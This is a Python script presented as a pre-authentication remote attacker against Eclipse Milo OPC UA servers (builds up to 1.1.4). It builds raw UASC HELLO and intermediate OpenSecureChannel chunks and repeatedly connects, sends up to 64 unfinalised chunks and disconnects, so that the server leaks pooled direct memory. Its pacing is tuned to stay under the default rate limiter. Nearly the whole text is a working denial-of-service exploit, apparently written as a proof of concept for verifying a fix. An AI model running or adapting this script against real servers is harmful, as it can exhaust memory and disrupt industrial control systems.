#!/usr/bin/env python3
"""
UASC pre-authentication memory-leak remote attacker -- raw UASC over real TCP.

Pure sockets + struct. No Milo, no OPC UA library, no third-party dependency of any
kind. This is a genuine remote, pre-authentication attack: it never completes an
OpenSecureChannel handshake, never authenticates, and never even receives a response
it inspects the content of.

For each connection it:
  1. Opens a TCP socket to the target.
  2. Sends a valid UASC HELLO (endpoint path must match a server endpoint, e.g. /milo).
  3. Reads the ACK.
  4. Sends CHUNKS_PER_CONN OpenSecureChannel chunks with chunk type 'C' (intermediate),
     SecurityPolicy.None, secureChannelId=0, and NEVER a final 'F' chunk. Each chunk is
     retained in the server's UascServerAsymmetricHandler.chunkBuffers list (pooled
     DIRECT ByteBufs, allocated by ChunkDecoder before any chunk-type or auth check).
  5. Abruptly closes the socket (TCP FIN). channelInactive fires on the server but --
     on vulnerable builds (<= 1.1.4) -- does NOT release chunkBuffers, so the pooled
     direct ByteBufs leak permanently. Fixed builds (>= 1.1.5) release them in
     channelInactive too, and pinned direct memory returns to baseline.

Staying at or below the server's maxChunkCount (default 64) avoids the "max chunk
count exceeded" exception path, which *would* release the buffers (exceptionCaught
already released them, even pre-fix -- only the channelInactive/handlerRemoved paths
were missing the release).
"""
import os
import socket
import struct
import sys
import time

HOST = os.environ.get("TARGET_HOST", "127.0.0.1")
PORT = int(os.environ.get("TARGET_PORT", "12686"))
ENDPOINT = os.environ.get("ENDPOINT_URL", f"opc.tcp://{HOST}:{PORT}/milo")
# Loop until DURATION_SEC elapses OR CONNECTIONS attempts made, whichever first.
DURATION_SEC = float(os.environ.get("DURATION_SEC", "45"))
CONNECTIONS = int(os.environ.get("CONNECTIONS", "100000"))
CHUNKS_PER_CONN = int(os.environ.get("CHUNKS_PER_CONN", "64"))
CHUNK_SIZE = int(os.environ.get("CHUNK_SIZE", "65535"))  # total chunk length incl header
# Pacing tuned to Milo's default RateLimitingHandler: it accepts a connection only if
# fewer than maxAttempts(=4) of the last 4 attempts fall inside a 1000ms window. Spacing
# attempts ~300ms apart pushes the 4th-oldest timestamp just outside the window, so ~3
# connections/s are ACCEPTED while the limiter is fully active (and it still rejects any
# faster probing). Hammering (e.g. 50ms) is the WORST strategy: it keeps the window
# saturated and gets throttled to almost nothing. This is a realistic rate-limited
# attacker, not a limiter bypass -- the limiter only exempts loopback peers, so it is
# genuinely active whenever the attacker is not connecting from 127.0.0.1/::1.
INTER_CONN_SLEEP = float(os.environ.get("INTER_CONN_SLEEP", "0.30"))
# Log at most every Nth throttled attempt to keep the transcript readable.
THROTTLE_LOG_EVERY = int(os.environ.get("THROTTLE_LOG_EVERY", "200"))

NONE_URI = b"http://opcfoundation.org/UA/SecurityPolicy#None"


def build_hello(endpoint: str) -> bytes:
    ep = endpoint.encode("utf-8")
    # protocolVersion, receiveBufferSize, sendBufferSize, maxMessageSize, maxChunkCount
    body = struct.pack("<IIIII", 0, 65535, 65535, 0, 0)
    body += struct.pack("<I", len(ep)) + ep
    return b"HEL" + b"F" + struct.pack("<I", 8 + len(body)) + body


def build_opn_chunk(chunk_type: bytes, total_len: int) -> bytes:
    # 3B "OPN" | 1B chunkType | 4B messageLength(LE) | 4B secureChannelId(LE)=0
    hdr = b"OPN" + chunk_type + struct.pack("<I", total_len) + struct.pack("<I", 0)
    # AsymmetricSecurityHeader: policyLen | policy | senderCert(-1) | receiverThumb(-1)
    asym = struct.pack("<I", len(NONE_URI)) + NONE_URI + struct.pack("<i", -1) + struct.pack("<i", -1)
    body = hdr + asym
    pad = total_len - len(body)
    if pad < 0:
        raise ValueError("CHUNK_SIZE too small for OPN header")
    return body + (b"\x00" * pad)


def main() -> int:
    print(
        f"ATTACKER start target={HOST}:{PORT} endpoint={ENDPOINT} durationSec={DURATION_SEC} "
        f"maxConnections={CONNECTIONS} chunksPerConn={CHUNKS_PER_CONN} chunkSize={CHUNK_SIZE}",
        flush=True,
    )
    hello = build_hello(ENDPOINT)
    chunk = build_opn_chunk(b"C", CHUNK_SIZE)
    intended_leak_per_conn = CHUNKS_PER_CONN * CHUNK_SIZE

    ok = 0
    throttled = 0
    errors = 0
    deadline = time.time() + DURATION_SEC
    i = -1
    while time.time() < deadline and (i + 1) < CONNECTIONS:
        i += 1
        try:
            s = socket.create_connection((HOST, PORT), timeout=10)
            local = s.getsockname()
            s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
            s.sendall(hello)
            s.settimeout(5)
            try:
                ack = s.recv(4096)
            except socket.timeout:
                ack = b""
            if not ack:
                # Server closed us immediately: rate-limiter rejection or no ACK.
                throttled += 1
                s.close()
                if throttled % THROTTLE_LOG_EVERY == 0:
                    print(
                        f"[attempt {i}] THROTTLED cumulative={throttled} (rate limiter active)",
                        flush=True,
                    )
                continue
            # Blast the intermediate OPN chunks, never finalize.
            for _ in range(CHUNKS_PER_CONN):
                s.sendall(chunk)
            time.sleep(0.05)  # let server drain + retain before FIN
            s.close()  # TCP FIN -> channelInactive -> leak (on vulnerable builds)
            ok += 1
            print(
                f"LEAK conn#{ok} (attempt {i}) local={local[0]}:{local[1]} "
                f"sent {CHUNKS_PER_CONN} chunks (~{intended_leak_per_conn} bytes) ackLen={len(ack)}",
                flush=True,
            )
        except Exception as e:  # noqa: BLE001
            errors += 1
            print(f"CONN {i} ERROR {type(e).__name__}: {e}", flush=True)
        if INTER_CONN_SLEEP:
            time.sleep(INTER_CONN_SLEEP)

    print(
        f"ATTACKER done leakingConns={ok} throttledConns={throttled} errorConns={errors} "
        f"intendedTotalLeakBytes={ok * intended_leak_per_conn}",
        flush=True,
    )
    return 0


if __name__ == "__main__":
    sys.exit(main())
